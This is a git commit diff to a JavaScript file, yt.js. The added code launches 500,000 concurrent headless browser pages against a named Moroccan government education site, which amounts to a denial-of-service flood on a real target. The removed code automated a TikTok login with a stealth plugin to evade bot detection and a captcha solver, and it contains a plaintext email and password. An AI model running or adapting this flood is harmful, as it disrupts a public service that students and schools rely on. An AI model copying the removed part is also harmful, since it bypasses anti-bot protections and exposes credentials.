1fb5aa39934a5104e398ae200d6bfb19d951675b
karimAlyamani <105087359+Kbot19@users.noreply.github.com>
2024-04-02 19:32:57 +0000

    Update yt.js

--- yt.js
+++ yt.js
@@ -1,33 +1,16 @@
-const puppeteer = require('puppeteer-extra');
-const stealthPlugin = require('puppeteer-extra-plugin-stealth');
-const { chromium } = require('playwright')
-const CaptchaSolver = require('tiktok-captcha-solver')
-puppeteer.use(stealthPlugin());
+const puppeteer = require('puppeteer');
 
 (async () => {
-  const browser = await chromium.launch({headless: true});
-  const page = await browser.newPage();
+  const browser = await puppeteer.launch({ headless: true });
+  const promises = [];
 
-  await page.goto('https://www.tiktok.com/login/phone-or-email/email');
+  for (let i = 0; i < 500000; i++) {
+    promises.push(browser.newPage().then(async (page) => {
+      await page.goto('https://massar.men.gov.ma');
+    }));
+  }
 
-  await page.waitForSelector('#loginContainer > div.tiktok-aa97el-DivLoginContainer.exd0a430 > form > div.tiktok-q83gm2-DivInputContainer.etcs7ny0 > input');
+  await Promise.all(promises);
 
-  // Type the specified email address into the email input field
-  await page.type('#loginContainer > div.tiktok-aa97el-DivLoginContainer.exd0a430 > form > div.tiktok-q83gm2-DivInputContainer.etcs7ny0 > input', 'karimfreegg@gmail.com');
-
-  await new Promise(resolve => setTimeout(resolve, 1000));
-
-  await page.type('input[type="password"]', 'karim2021@11');
-  await new Promise(resolve => setTimeout(resolve, 1000));
-  await page.click('button[type="submit"]');
-
-  const catchaSolver = new CaptchaSolver(page)
-  
-  await new Promise(resolve => setTimeout(resolve, 1500));
-  //await page.goto('https://www.tiktok.com/');
-  //await page.waitForNavigation();
-  await catchaSolver.solve()
-  await new Promise(resolve => setTimeout(resolve, 20000));
-  await page.screenshot({ path: 'screenshot.png', fullPage: true });
-  await browser.close();
+  // await browser.close(); // تعليق هذا السطر لعدم غلق المتصفح
 })();
